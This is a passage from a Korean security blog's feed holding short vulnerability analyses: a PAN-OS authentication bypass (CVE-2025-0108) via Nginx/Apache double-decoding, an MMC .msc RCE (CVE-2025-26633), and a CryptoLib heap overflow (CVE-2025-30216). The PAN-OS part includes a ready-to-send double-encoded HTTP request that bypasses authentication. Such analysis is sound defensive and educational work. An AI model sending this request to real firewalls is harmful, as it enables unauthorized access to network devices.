class="hljs-string">&quot;/&quot;</span>&gt;</span>    <span class="hljs-attribute">DirectorySlash</span> <span class="hljs-literal">off</span>    <span class="hljs-attribute"><span class="hljs-nomarkup">RewriteEngine</span></span> <span class="hljs-literal">on</span>    <span class="hljs-attribute"><span class="hljs-nomarkup">RewriteRule</span></span> ^(.*)(\/PAN_help\/)(.*)\.(css|js|html|htm)$ $<span class="hljs-number">1</span>$<span class="hljs-number">2</span>$<span class="hljs-number">3</span>.$<span class="hljs-number">4</span>.gz<span class="hljs-meta"> [QSA,L]</span>    <span class="hljs-attribute">AddEncoding</span> gzip .gz    <span class="hljs-attribute"><span class="hljs-nomarkup">Options</span></span> Indexes FollowSymLinks    <span class="hljs-attribute">Require</span> <span class="hljs-literal">all</span> granted<span class="hljs-section">&lt;/Location&gt;</span></code></pre><ul><li>&#xC694;&#xCCAD;&#xC774; Apache&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xBA74;, Apache&#xB294; &#xB2E4;&#xC2DC; &#xACBD;&#xB85C;&#xB97C; &#xD574;&#xC11D;&#xD558;&#xACE0; &#xB0B4;&#xBD80; &#xB9AC;&#xB514;&#xB809;&#xC158;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; <strong>URL&#xC774; &#xD55C; &#xBC88; &#xB354; &#xB514;&#xCF54;&#xB529;&#xB428;</strong>&#xC73C;&#xB85C; &#xC778;&#xD574; Path Confusion&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xC0DD;&#xAE41;&#xB2C8;&#xB2E4;.</li></ul><hr><h3 id="3-PHP-&#xB2E8;&#xACC4;"><a href="#3-PHP-&#xB2E8;&#xACC4;" class="headerlink" title="3. PHP &#xB2E8;&#xACC4;"></a><strong>3. PHP &#xB2E8;&#xACC4;</strong></h3><p>Apache&#xC5D0;&#xC11C; &#xC804;&#xB2EC;&#xB41C; &#xC694;&#xCCAD;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xC2E4;&#xC81C; &#xC778;&#xC99D; &#xC5EC;&#xBD80;&#xB97C; &#xD310;&#xB2E8;&#xD558;&#xACE0; &#xC694;&#xCCAD;&#xC744; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs awk"><span class="hljs-keyword">if</span> (    <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&apos;HTTP_X_PAN_AUTHCHECK&apos;</span>] != <span class="hljs-string">&apos;off&apos;</span>    &amp;&amp; <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&apos;PHP_SELF&apos;</span>] !== <span class="hljs-string">&apos;/CA/ocsp&apos;</span>    &amp;&amp; <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&apos;PHP_SELF&apos;</span>] !== <span class="hljs-string">&apos;/php/login.php&apos;</span>    &amp;&amp; stristr(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&apos;REMOTE_HOST&apos;</span>], <span class="hljs-string">&apos;127.0.0.1&apos;</span>) === false) {    <span class="hljs-regexp">//</span> ... check authentication ...}</code></pre><ul><li>&#xC694;&#xCCAD;&#xC774; PHP &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC73C;&#xB85C; &#xC804;&#xB2EC;&#xB420; &#xB54C; <code>X-pan-AuthCheck: off</code> &#xC0C1;&#xD0DC;&#xB77C;&#xBA74;, &#xC778;&#xC99D;&#xC774; &#xBD88;&#xD544;&#xC694;&#xD55C; &#xAC83;&#xC73C;&#xB85C; &#xAC04;&#xC8FC;&#xB429;&#xB2C8;&#xB2E4;.</li></ul><hr><h2 id="Apache&#xC758;-&#xACBD;&#xB85C;-&#xC7AC;&#xD574;&#xC11D;-&#xBB38;&#xC81C;"><a href="#Apache&#xC758;-&#xACBD;&#xB85C;-&#xC7AC;&#xD574;&#xC11D;-&#xBB38;&#xC81C;" class="headerlink" title="Apache&#xC758; &#xACBD;&#xB85C; &#xC7AC;&#xD574;&#xC11D; &#xBB38;&#xC81C;"></a><strong>Apache&#xC758; &#xACBD;&#xB85C; &#xC7AC;&#xD574;&#xC11D; &#xBB38;&#xC81C;</strong></h2><p>Apache&#xB294; <code>RewriteRule</code>&#xC744; &#xCC98;&#xB9AC;&#xD560; &#xB54C; &#xB0B4;&#xBD80; &#xB9AC;&#xB514;&#xB809;&#xC158;(Internal Redirect)&#xC744; &#xC218;&#xD589;&#xD558;&#xB294;&#xB370;, &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; URL&#xC774; &#xB2E4;&#xC2DC; &#xD55C; &#xBC88; &#xB514;&#xCF54;&#xB529;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs apache"><span class="hljs-attribute"><span class="hljs-nomarkup">RewriteRule</span></span> (.*)\.abc$ $<span class="hljs-number">1</span><span class="hljs-meta"> [L]</span></code></pre><p>&#xC774;&#xC911; &#xB514;&#xCF54;&#xB529;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xBB38;&#xC81C;&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xBA74;, &#xACF5;&#xACA9;&#xC790;&#xB294; <strong>&#xC774;&#xC911; URL &#xC778;&#xCF54;&#xB529;(Double Encoding)&#xC744; &#xD65C;&#xC6A9;&#xD558;&#xC5EC; &#xC778;&#xC99D; &#xC6B0;&#xD68C;&#xB97C; &#xC2DC;&#xB3C4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</strong></p><hr><p>&#xACF5;&#xACA9;&#xC790;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xC694;&#xCCAD;&#xC744; &#xC804;&#xC1A1;&#xD558;&#xC5EC; &#xC778;&#xC99D;&#xC744; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;:</p><pre><code class="hljs awk">GET <span class="hljs-regexp">/unauth/</span>%<span class="hljs-number">252</span>e%<span class="hljs-number">252</span>e<span class="hljs-regexp">/php/</span>ztp_gate.php<span class="hljs-regexp">/PAN_help/</span>x.css HTTP/<span class="hljs-number">1.1</span>Host: target.firewallConnection: close</code></pre><p><strong>&#xC694;&#xCCAD;&#xC774; &#xCC98;&#xB9AC;&#xB418;&#xB294; &#xACFC;&#xC815;</strong></p><ol><li><strong>Nginx &#xCC98;&#xB9AC;</strong><ul><li><code>%252e%252e</code>&#xB294; &#xCCAB; &#xBC88;&#xC9F8; URL &#xB514;&#xCF54;&#xB529;&#xC5D0;&#xC11C; <code>%2e%2e</code>(<code>..</code>)&#xB85C; &#xBCC0;&#xD658;&#xB428;</li><li><code>/unauth/%2e%2e/php/ztp_gate.php/PAN_help/x.css</code> &#xACBD;&#xB85C;&#xAC00; <code>/unauth/</code>&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xBBC0;&#xB85C; <code>X-pan-AuthCheck: off</code>&#xAC00; &#xC124;&#xC815;&#xB428; (&#xC989;, &#xC778;&#xC99D; &#xBD88;&#xD544;&#xC694;)</li></ul></li><li><strong>Apache &#xCC98;&#xB9AC;</strong><ul><li>Apache&#xAC00; &#xD574;&#xB2F9; &#xACBD;&#xB85C;&#xB97C; &#xC7AC;&#xCC98;&#xB9AC;&#xD558;&#xBA70; &#xB0B4;&#xBD80; &#xB9AC;&#xB514;&#xB809;&#xC158; &#xC218;&#xD589;</li><li><code>%2e%2e</code>&#xAC00; &#xB2E4;&#xC2DC; &#xB514;&#xCF54;&#xB529;&#xB418;&#xC5B4; &#xC2E4;&#xC81C; &#xC694;&#xCCAD; &#xACBD;&#xB85C;&#xAC00; <code>/php/ztp_gate.php/PAN_help/x.css</code>&#xB85C; &#xBCC0;&#xACBD;&#xB428;</li><li>Apache&#xB294; &#xC774; &#xC694;&#xCCAD;&#xC744; &#xC815;&#xC0C1;&#xC801;&#xC778; PHP &#xC2E4;&#xD589; &#xC694;&#xCCAD;&#xC73C;&#xB85C; &#xD310;&#xB2E8;&#xD558;&#xC5EC; <code>ztp_gate.php</code>&#xB97C; &#xC2E4;&#xD589;</li></ul></li><li><strong>PHP &#xC2E4;&#xD589;</strong><ul><li>&#xC694;&#xCCAD;&#xC774; <code>/php/ztp_gate.php</code>&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xC5C8;&#xC73C;&#xBA70;, <code>X-pan-AuthCheck: off</code> &#xC0C1;&#xD0DC;&#xC774;&#xBBC0;&#xB85C; &#xC778;&#xC99D; &#xC5C6;&#xC774; &#xC2E4;&#xD589;&#xB428;</li></ul></li></ol><hr><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; <strong>PAN-OS 10.2.13-h3, 11.1.6-h1, 11.2.4-h4 &#xC774;&#xD6C4; &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</strong></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/clalxk/">clalxk</category>
      
      <category domain="https://hackyboiz.github.io/tags/PAN-OS/">PAN-OS</category>
      
      <category domain="https://hackyboiz.github.io/tags/Nginx/">Nginx</category>
      
      <category domain="https://hackyboiz.github.io/tags/Apache/">Apache</category>
      
      <category domain="https://hackyboiz.github.io/tags/Path-Confusion/">Path Confusion</category>
      
      <category domain="https://hackyboiz.github.io/tags/Authentication-Bypass/">Authentication Bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-0108/">CVE-2025-0108</category>
      
      
      <comments>https://hackyboiz.github.io/2025/04/03/clalxk/CVE-2025-0108/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-26633: Microsoft Management Console(MMC)의 MUIPath 경로를 통한 RCE 취약점</title>
      <link>https://hackyboiz.github.io/2025/04/02/ogu123/cve-2025-26633/</link>
      <guid>https://hackyboiz.github.io/2025/04/02/ogu123/cve-2025-26633/</guid>
      <pubDate>Wed, 02 Apr 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.trendmicro.com/en_us/research/25/c/cve-</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://www.trendmicro.com/en_us/research/25/c/cve-2025-26633-water-gamayun.html">https://www.trendmicro.com/en_us/research/25/c/cve-2025-26633-water-gamayun.html</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>&#xC9C0;&#xC6D0;&#xB418;&#xB294; &#xBAA8;&#xB4E0; &#xBC84;&#xC804;&#xC758; Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xB7EC;&#xC2DC;&#xC544; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4; &#xADF8;&#xB8F9; Water Gamayun(EncryptHub, Larva-208&#xB85C;&#xB3C4; &#xBD88;&#xB9BC;)&#xC774; MMC(Microsoft Management Console)&#xC758; &#xC81C;&#xB85C;&#xB370;&#xC774; &#xCDE8;&#xC57D;&#xC810;(CVE-2025-26633)&#xC744; &#xD65C;&#xC6A9;&#xD574; &#xC545;&#xC131;&#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xBC0F; &#xB370;&#xC774;&#xD130; &#xD0C8;&#xCDE8;&#xC744; &#xC218;&#xD589;&#xD55C; &#xAC83;&#xC73C;&#xB85C; &#xBC1D;&#xD600;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/04/02/ogu123/cve-2025-26633/1.png" alt></p><p>MMC&#xB294; Windows&#xC758; &#xAC01;&#xC885; &#xC124;&#xC815;(&#xC7A5;&#xCE58; &#xAD00;&#xB9AC;&#xC790;, &#xC791;&#xC5C5; &#xC2A4;&#xCF00;&#xC904;&#xB7EC; &#xB4F1;)&#xC744; &#xD55C;&#xACF3;&#xC5D0;&#xC11C; &#xD560; &#xC218; &#xC788;&#xAC8C; &#xD574;&#xC8FC;&#xACE0; &#xC5EC;&#xB7EC; &#xC124;&#xC815;&#xC744;  .msc &#xD30C;&#xC77C;&#xB85C; &#xC800;&#xC7A5;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; .msc &#xD30C;&#xC77C;&#xACFC; MUIPath(Multilingual User Interface Path)&#xB97C; &#xCC98;&#xB9AC;&#xD560; &#xB54C; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/04/02/ogu123/cve-2025-26633/2.png" alt></p><p>MMC&#xAC00; .msc &#xD30C;&#xC77C;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; <code>ScOnOpenDocument</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. </p><p><code>ScOnOpenDocument</code>&#xB294; <code>ScGetMuiPath</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; MUIPath(en-US) &#xD3F4;&#xB354;&#xC5D0; &#xB3D9;&#xC77C;&#xD55C; &#xC774;&#xB984;&#xC758; .msc &#xD30C;&#xC77C;&#xC774; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xB9CC;&#xC57D; MUIPath(en-US) &#xD3F4;&#xB354;&#xC5D0; &#xAC19;&#xC740; &#xC774;&#xB984;&#xC758; .msc &#xD30C;&#xC77C;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xBA74;, &#xC6D0;&#xBCF8; .msc &#xD30C;&#xC77C; &#xB300;&#xC2E0; MUIPath(en-US) &#xD3F4;&#xB354;&#xC758; .msc&#xB97C; &#xC6B0;&#xC120; &#xB85C;&#xB4DC;&#xD558;&#xC5EC; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C;, &#xACF5;&#xACA9;&#xC790;&#xB294; &#xB3D9;&#xC77C;&#xD55C; &#xC774;&#xB984;&#xC758; &#xC545;&#xC131; .msc&#xB97C; en-US &#xD3F4;&#xB354;&#xC5D0; &#xB123;&#xC5B4;&#xC73C;&#xB85C;&#xC368; &#xC545;&#xC131; &#xD30C;&#xC77C;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xB3C4;&#xB85D; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/04/02/ogu123/cve-2025-26633/3.png" alt></p><p><img src="/2025/04/02/ogu123/cve-2025-26633/4.png" alt></p><p>&#xACF5;&#xACA9;&#xC790;&#xB294; MMC&#xC758; ActiveX &#xCEE8;&#xD2B8;&#xB864; &#xC2A4;&#xB0C5;&#xC778; &#xB0B4;&#xC5D0;&#xC11C; ExecuteShellCommand &#xBA54;&#xC11C;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xB97C; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xD55C;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://www.securityweek.com/russian-ransomware-gang-exploited-windows-zero-day-before-patch/">https://www.securityweek.com/russian-ransomware-gang-exploited-windows-zero-day-before-patch/</a></li><li><a href="https://www.ncsc.go.kr:4018/main/cop/bbs/selectBoardArticle.do?bbsId=Notification_main&amp;nttId=202421&amp;pageIndex=1&amp;searchCnd2=">https://www.ncsc.go.kr:4018/main/cop/bbs/selectBoardArticle.do?bbsId=Notification_main&amp;nttId=202421&amp;pageIndex=1&amp;searchCnd2=</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/ogu123/">ogu123</category>
      
      <category domain="https://hackyboiz.github.io/tags/MMC/">MMC</category>
      
      <category domain="https://hackyboiz.github.io/tags/MUI/">MUI</category>
      
      <category domain="https://hackyboiz.github.io/tags/Water-Gamayun/">Water Gamayun</category>
      
      <category domain="https://hackyboiz.github.io/tags/EncryptHub/">EncryptHub</category>
      
      <category domain="https://hackyboiz.github.io/tags/Larva-208/">Larva-208</category>
      
      
      <comments>https://hackyboiz.github.io/2025/04/02/ogu123/cve-2025-26633/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-30216: CryptoLib의 Heap Buffer Overflow 취약점</title>
      <link>https://hackyboiz.github.io/2025/03/29/l0ch/2025-03-29/</link>
      <guid>https://hackyboiz.github.io/2025/03/29/l0ch/2025-03-29/</guid>
      <pubDate>Sat, 29 Mar 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/nasa/CryptoLib/security/advis</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><p><a href="https://github.com/nasa/CryptoLib/security/advisories/GHSA-v3jc-5j74-hcjv">https://github.com/nasa/CryptoLib/security/advisories/GHSA-v3jc-5j74-hcjv</a></p></li><li><p><a href="https://securityonline.info/cryptolib-vulnerability-heap-overflow-threatens-space-communications/">https://securityonline.info/cryptolib-vulnerability-heap-overflow-threatens-space-communications/</a></p></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>CryptoLib &lt;= 1.3.3</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xD56D;&#xACF5;&#xC6B0;&#xC8FC; &#xBD84;&#xC57C;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; NASA&#xC758; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC778; CryptoLib&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; &#xCDE8;&#xC57D;&#xC810; CVE-2025-30216&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; CryptoLib&#xC774; TM &#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xD328;&#xD0B7;&#xC744; &#xD30C;&#xC2F1;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xD558;&#xB294; <code>src/core/crypto_tm.c</code> &#xC758; <code>Crypto_TM_ProcessSecurity()</code> &#xD568;&#xC218;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. </p><blockquote><p>TM &#xD504;&#xB85C;&#xD1A0;&#xCF5C;(Telemetry Space Data Link Protocol) &#xC740; &#xC6B0;&#xC8FC;&#xC120;&#xACFC; &#xC9C0;&#xC0C1;&#xAD6D; &#xAC04; &#xD1B5;&#xC2E0;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; <strong>CCSDS(Cosultative Committee for Space Data Systems) &#xD504;&#xB85C;&#xD1A0;&#xCF5C;</strong>&#xC758; &#xD558;&#xC704; &#xB370;&#xC774;&#xD130;&#xB9C1;&#xD06C; &#xACC4;&#xCE35; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xB85C;, &#xB2E8;&#xC77C; &#xC6B0;&#xC8FC; &#xB9C1;&#xD06C;&#xB97C; &#xD1B5;&#xD574; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC804;&#xC1A1;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD568;.</p></blockquote><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int32_t</span> <span class="hljs-title">Crypto_TM_ProcessSecurity</span><span class="hljs-params">(<span class="hljs-keyword">uint8_t</span> *p_ingest, <span class="hljs-keyword">uint16_t</span> len_ingest, <span class="hljs-keyword">uint8_t</span> **pp_processed_frame,</span></span><span class="hljs-function"><span class="hljs-params">                                  <span class="hljs-keyword">uint16_t</span> *p_decrypted_length)</span></span><span class="hljs-function"></span>{<span class="hljs-comment">//...</span>status = Crypto_TM_Process_Setup(len_ingest, &amp;byte_idx, p_ingest, &amp;secondary_hdr_len);<span class="hljs-comment">//...</span><span class="hljs-keyword">if</span> (status == CRYPTO_LIB_SUCCESS){    <span class="hljs-comment">// Allocate buffer</span>  p_new_dec_frame = (<span class="hljs-keyword">uint8_t</span>*)<span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, (len_ingest) * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">uint8_t</span>));<span class="hljs-comment">//..</span>}<span class="hljs-keyword">if</span> (status == CRYPTO_LIB_SUCCESS){<span class="hljs-comment">// Copy over TM Primary Header (6 bytes),Secondary (if present)</span>    <span class="hljs-comment">// If present, the TF Secondary Header will follow the TF PriHdr</span>    <span class="hljs-built_in">memcpy</span>(p_new_dec_frame, &amp;p_ingest[<span class="hljs-number">0</span>], <span class="hljs-number">6</span> + secondary_hdr_len);<span class="hljs-comment">//..</span>}</code></pre><blockquote><p><a href="https://github.com/nasa/CryptoLib/blob/7930b71f3e76ed9a6181a006558dd82bacc877d3/src/core/crypto_tm.c#L1824">https://github.com/nasa/CryptoLib/blob/7930b71f3e76ed9a6181a006558dd82bacc877d3/src/core/crypto_tm.c#L1824</a></p></blockquote><p>&#xD574;&#xB2F9; &#xD568;&#xC218;&#xB294; TM &#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xD328;&#xD0B7; &#xD30C;&#xC2F1; &#xC2DC; &#xCD1D; &#xD328;&#xD0B7; &#xAE38;&#xC774;&#xC778; <code>len_ingest</code> &#xB9CC;&#xD07C;&#xC758; &#xD799; &#xBC84;&#xD37C; <code>p_new_dec_frame</code> &#xB97C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xC774;&#xD6C4; &#xD328;&#xD0B7; &#xB370;&#xC774;&#xD130;&#xB97C; <code>p_new_dec_frame</code> &#xBC84;&#xD37C;&#xB85C; &#xBCF5;&#xC0AC;&#xD558;&#xB294;&#xB370;, &#xC774;&#xB54C; &#xBCF5;&#xC0AC;&#xD560; &#xD06C;&#xAE30;&#xB294; 6 bytes&#xB85C; &#xACE0;&#xC815;&#xB41C; TM Primary Header&#xC640; &#xAC00;&#xBCC0; &#xD06C;&#xAE30;&#xC778; TF Secondary Header&#xB97C; &#xB354;&#xD574; &#xACC4;&#xC0B0;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xACC4;&#xC0B0; &#xACB0;&#xACFC;&#xAC00; <code>p_new_dec_frame</code> &#xBC84;&#xD37C; &#xD06C;&#xAE30;&#xBCF4;&#xB2E4; &#xD070;&#xC9C0; &#xAC80;&#xC99D;&#xD558;&#xC9C0; &#xC54A;&#xC544; Heap Buffer Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>TF Secondary Header &#xD06C;&#xAE30;&#xC778; <code>secondary_hdr_len</code>&#xC740; <code>Crypto_TM_Process_Setup()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xACB0;&#xC815;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int32_t</span> <span class="hljs-title">Crypto_TM_Process_Setup</span><span class="hljs-params">(<span class="hljs-keyword">uint16_t</span> len_ingest, <span class="hljs-keyword">uint16_t</span> *byte_idx, <span class="hljs-keyword">uint8_t</span> *p_ingest, <span class="hljs-keyword">uint8_t</span> *secondary_hdr_len)</span></span><span class="hljs-function"></span>{<span class="hljs-comment">// ...</span>  <span class="hljs-keyword">if</span> (status == CRYPTO_LIB_SUCCESS)  {      <span class="hljs-comment">// Secondary Header flag is 1st bit of 5th byte (index 4)</span>      *byte_idx = <span class="hljs-number">4</span>;      <span class="hljs-keyword">if</span> ((p_ingest[*byte_idx] &amp; <span class="hljs-number">0x80</span>) == <span class="hljs-number">0x80</span>)      {<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> TM_DEBUG</span>          <span class="hljs-built_in">printf</span>(KYEL <span class="hljs-string">&quot;A TM Secondary Header flag is set!\n&quot;</span>);<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>          <span class="hljs-comment">// Secondary header is present</span>          *byte_idx = <span class="hljs-number">6</span>;          <span class="hljs-comment">// Determine length of secondary header</span>          <span class="hljs-comment">// Length coded as total length of secondary header - 1</span>          <span class="hljs-comment">// Reference CCSDS 132.0-B-2 4.1.3.2.3</span>          *secondary_hdr_len = (p_ingest[*byte_idx] &amp; <span class="hljs-number">0x3F</span>) + <span class="hljs-number">1</span>;<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> TM_DEBUG</span>          <span class="hljs-built_in">printf</span>(KYEL <span class="hljs-string">&quot;Secondary Header Length is decoded as: %d\n&quot;</span>, *secondary_hdr_len);<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>          <span class="hljs-comment">// Increment from current byte (1st byte of secondary header),</span>          <span class="hljs-comment">// to where the SPI would start</span>          *byte_idx += *secondary_hdr_len;      }      <span class="hljs-keyword">else</span>      {          <span class="hljs-comment">// No Secondary header, carry on as usual and increment to SPI start</span>          *byte_idx = <span class="hljs-number">6</span>;      }  }</code></pre><blockquote><p><a href="https://github.com/nasa/CryptoLib/blob/7930b71f3e76ed9a6181a006558dd82bacc877d3/src/core/crypto_tm.c#L1262">https://github.com/nasa/CryptoLib/blob/7930b71f3e76ed9a6181a006558dd82bacc877d3/src/core/crypto_tm.c#L1262</a></p></blockquote><p><code>secondary_hdr_len</code>&#xC740; <code>(p_ingest[*byte_idx] &amp; 0x3F) + 1;</code> &#xACC4;&#xC0B0;&#xC2DD;&#xC744; &#xD1B5;&#xD574; &#xCD5C;&#xB300; &#xD06C;&#xAE30;&#xB97C; 0x3F+1 (64 bytes) &#xC73C;&#xB85C; &#xC81C;&#xD55C;&#xD558;&#xC9C0;&#xB9CC;, &#xC5EC;&#xC804;&#xD788; <code>len_ingest</code> &#xC640; &#xAD00;&#xB828;&#xB41C; &#xAC80;&#xC0AC;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; <code>len_ingest</code>&#xAC00; <code>6 + secondary_hdr_len</code> &#xBCF4;&#xB2E4; &#xC791;&#xC740; &#xACBD;&#xC6B0; &#xBCF5;&#xC0AC; &#xACFC;&#xC815;&#xC5D0;&#xC11C; <code>p_new_dec_frame</code> &#xBC84;&#xD37C;&#xC5D0;&#xC11C; buffer overflow&#xAC00; &#xD2B8;&#xB9AC;&#xAC70;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC545;&#xC6A9;&#xB420; &#xACBD;&#xC6B0; Denial of Service &#xACF5;&#xACA9;&#xC744; &#xD1B5;&#xD574; &#xC6B0;&#xC8FC;&#xC120;&#xACFC; &#xC9C0;&#xC0C1;&#xAD6D; &#xAC04; &#xD1B5;&#xC2E0; &#xC7A5;&#xC560;&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0A4;&#xAC70;&#xB098;, RCE exploit&#xC744; &#xD1B5;&#xD574; &#xD328;&#xD0B7;&#xC744; &#xC218;&#xC2E0;&#xD55C; &#xC6B0;&#xC8FC;&#xC120; &#xB610;&#xB294; &#xC9C0;&#xC0C1;&#xAD6D; &#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">    <span class="hljs-keyword">if</span> (status == CRYPTO_LIB_SUCCESS)    {        <span class="hljs-comment">// Secondary Header flag is 1st bit of 5th byte (index 4)</span>        *byte_idx = <span class="hljs-number">4</span>;        <span class="hljs-keyword">if</span> ((p_ingest[*byte_idx] &amp; <span class="hljs-number">0x80</span>) == <span class="hljs-number">0x80</span>)        {<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> TM_DEBUG</span>            <span class="hljs-built_in">printf</span>(KYEL <span class="hljs-string">&quot;A TM Secondary Header flag is set!\n&quot;</span>);<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>            <span class="hljs-comment">// Secondary header is present</span>            *byte_idx = <span class="hljs-number">6</span>;            <span class="hljs-comment">// Determine length of secondary header</span>            <span 